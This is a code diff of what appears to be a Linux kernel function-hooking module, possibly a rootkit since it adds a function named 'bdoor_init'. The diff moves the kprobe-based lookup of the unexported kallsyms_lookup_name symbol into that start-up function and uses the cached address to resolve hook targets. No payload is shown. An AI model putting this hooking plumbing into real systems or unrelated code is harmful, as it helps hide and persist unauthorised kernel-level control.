@@ -12,10 +12,24 @@
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+kallsyms_lookup_name_t kallsyms_lookup_namez;
+
 #endif
+
+int bdoor_init(void)
+{
+#ifdef KPROBE_LOOKUP
+	register_kprobe(&kp);
+	kallsyms_lookup_namez = (kallsyms_lookup_name_t) kp.addr;
+	unregister_kprobe(&kp);
+#endif
+	return 0;
+}
 
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
 {
+	/*
 #ifdef KPROBE_LOOKUP
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 	kallsyms_lookup_name_t kallsyms_lookup_name;
@@ -23,7 +37,12 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 	unregister_kprobe(&kp);
 #endif
+	*/
+#ifdef KPROBE_LOOKUP
+	hook->addr = kallsyms_lookup_namez(hook->name);
+#else
 	hook->addr = kallsyms_lookup_name(hook->name);
+#endif
 
 	if (!hook->addr)
 	{
